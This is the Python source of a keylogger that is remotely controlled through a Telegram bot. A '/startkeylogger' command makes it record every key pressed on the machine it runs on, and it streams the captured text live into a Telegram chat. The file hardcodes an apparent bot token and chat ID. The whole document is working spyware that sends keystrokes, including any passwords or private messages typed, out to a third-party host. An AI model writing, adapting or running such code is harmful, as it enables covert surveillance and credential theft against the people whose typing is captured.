from pynput import keyboard
from telegram import Bot
from telegram import ParseMode
from telegram import ChatAction
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import threading
from pynput.keyboard import Key
from pynput.keyboard import Listener, Key


keystrokes = ""
message_id = None
TOKEN = "6845961407:AAGbKJc7LSpkokCVw-jJg9ByyaLoO3oBT_Q"
CHAT_ID = "5118057698"


# Initialize the Updater
updater = Updater(TOKEN, use_context=True)
bot = updater.bot

# Function to handle each key release event


def on_release(key, update):
    global keystrokes, message_id
    if key == Key.esc:
        return False

    if hasattr(key, 'char') and key.char is not None:
        keystrokes += key.char
    elif key == Key.space:
        keystrokes += '\xa0'  # Replace space with non-breaking space
    elif key == Key.enter:
        keystrokes += "\n"
    elif key == Key.backspace:
        keystrokes = keystrokes[:-1]

    send_typing_action(update.message.chat_id)

    if message_id is None:
        # Send the initial message if keystrokes are not empty
        if keystrokes:
            msg = bot.send_message(
                update.message.chat_id, text=f"`{keystrokes}`", parse_mode=ParseMode.MARKDOWN)
            message_id = msg.message_id
    else:
        # Edit the existing message if keystrokes are not empty
        if keystrokes:
            bot.edit_message_text(chat_id=update.message.chat_id, message_id=message_id,
                                  text=f"`{keystrokes}`", parse_mode=ParseMode.MARKDOWN)


def keylogger(update, context):
    global keystrokes, message_id
    keystrokes = ""
    chat_id = update.message.chat_id
    message_id = None
    update.message.reply_text("Keylogger started. Press 'Esc' to stop.")
    with keyboard.Listener(on_release=lambda key: on_release(key, update)) as listener:
        listener.join()
    print("Captured keystrokes:", keystrokes)


# Command to start the keylogger
updater.dispatcher.add_handler(CommandHandler('startkeylogger', keylogger))

# Send a message with typing action


def send_typing_action(chat_id):
    bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)


# Start the bot
updater.start_polling()
updater.idle()
